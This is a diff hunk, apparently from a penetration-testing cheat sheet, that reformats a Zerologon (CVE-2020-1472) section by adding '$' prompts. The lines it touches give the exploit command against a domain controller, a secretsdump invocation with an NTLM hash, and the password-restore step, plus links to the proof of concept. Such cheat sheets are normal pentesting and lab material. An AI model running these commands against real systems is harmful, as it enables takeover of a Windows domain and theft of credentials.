@@ -3518,18 +3518,18 @@ https://www.exploit-db.com/exploits/47502
 
 ```bash
 # Github
-https://github.com/dirkjanm/CVE-2020-1472
+$ https://github.com/dirkjanm/CVE-2020-1472
 
 # Commands (Exploit)
-python3 cve-2020-1472-exploit.py BANK 10.10.10.10
+$python3 cve-2020-1472-exploit.py BANK 10.10.10.10
 
 # Commands (Restore Password)
-1. Get plain_password_hex 
+$ Get plain_password_hex 
 -> secretsdump.py bank.local/Administrator@BANK -target-ip 10.10.10.10  -hashes aad3b435b51404eeaad3b435b51404ee:32db622ed9c00dd1039d8288b0407460
-2. python3 restorepassword.py return.local/printer@printer -target-ip 10.10.11.108 -hexpass <HEXPASS>
+$ python3 restorepassword.py return.local/printer@printer -target-ip 10.10.11.108 -hexpass <HEXPASS>
 
 # References
-https://nv2lt.github.io/windows/CVE-2020-1472-Step-by-Step-Procedure/
+$ https://nv2lt.github.io/windows/CVE-2020-1472-Step-by-Step-Procedure/
 
 ```
 
